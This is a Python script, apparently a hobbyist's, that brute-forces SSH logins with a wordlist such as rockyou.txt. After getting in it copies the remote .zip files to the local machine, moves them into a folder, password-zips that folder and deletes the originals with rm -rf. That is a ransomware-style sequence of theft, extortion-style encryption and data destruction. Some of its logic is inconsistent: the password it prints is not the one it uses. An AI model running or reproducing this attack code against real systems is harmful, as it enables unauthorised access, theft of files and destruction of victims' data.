#!/usr/bin/env python3
# Script is for fun 
# Resources Google, Bard, ChatGPT

import paramiko #install with pip install paramiko
import os
from paramiko import SSHClient, AutoAddPolicy
from scp import SCPClient # Install with pip install scp



def brute_force_ssh(hostname, username, password_file):
    # Create an SSH client instance
    client = paramiko.SSHClient()
    port = 22
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    # Open the password file
    with open(password_file, 'r') as f:
        # Loop through each line in the file
        for password in f:
            password = password.strip()  # Remove leading/trailing whitespaces and newline characters
            print(f"Trying password: {password}")
            # Attempt SSH connection with the password
            try:
                client.connect(hostname, port, username, password)

                # Print the current working directory   
                stdin, stdout, stderr = client.exec_command("pwd")
                output = stdout.read().decode().strip()
                print(f"Current working directory: {output}")

                # List files and search for .zip files
                stdin, stdout, stderr = client.exec_command("find . -name '*.zip'")
                zip_files = stdout.read().decode().strip().split('\n')
                print("Found zip files:")
                for zip_file in zip_files:
                    print(zip_file)

                    # Create a new folder named 'itworked' on the local machine if it doesn't exist
                    local_folder_path = os.path.join(os.getcwd(), "itworked")
                    if not os.path.exists(local_folder_path):
                        os.makedirs(local_folder_path)

                    # Define the local path where the zip file will be copied
                    local_copy_path = os.path.join(local_folder_path, os.path.basename(zip_file))

                    # Copy the zip file from the remote server to the local machine
                    with SCPClient(client.get_transport()) as scp:
                        scp.get(zip_file, local_copy_path)
                    
                    print(f"Successfully copied {zip_file} to {local_copy_path}")

                    # Create a new folder named 'minenow' on the remote machine if it doesn't exist
                    remote_folder_path = "/home/will/minenow"
                    create_folder_command = f"mkdir -p {remote_folder_path}"
                    client.exec_command(create_folder_command)

                    # Move the zip file to the 'minenow' folder
                    move_command = f"mv {zip_file} {remote_folder_path}"
                    client.exec_command(move_command)
                    print(f"Successfully moved {zip_file} to {remote_folder_path}")

                # Encrypt the 'minenow' folder with password 'password1234'
                zip_command = f"zip -r -P {password} {remote_folder_path}.zip {remote_folder_path}"
                client.exec_command(zip_command)
                print(f"Successfully encrypted {remote_folder_path} to {remote_folder_path}.zip with password 'password1234'")

                # Delete the original .zip files
                delete_command = f"rm -rf {remote_folder_path}"
                client.exec_command(delete_command)
                print(f"Successfully deleted the original files in {remote_folder_path}")

                break  # Exit the loop after finding and processing the files
            except Exception as e:
                print(f"Error: {e}")
        else:
            # No valid password found if the loop completes without successful authentication
            print("No valid password found.")

    # Close the SSH connection
    client.close()

def main():
    # Prompt user for SSH connection details
    hostname = input("Enter the hostname or IP address of the remote server (default: 192.168.50.30): ") or '192.168.50.30'
    username = input("Enter your username (default: will): ") or 'will'
    password = input("Enter your password (press Enter to skip): ")

    if password:
        brute_force_ssh(hostname, username, password)
    else:
        password_file = input("Enter the path to the password file (default: rockyou.txt): ") or 'rockyou.txt'
        brute_force_ssh(hostname, username, password_file)

if __name__ == "__main__":
    main()
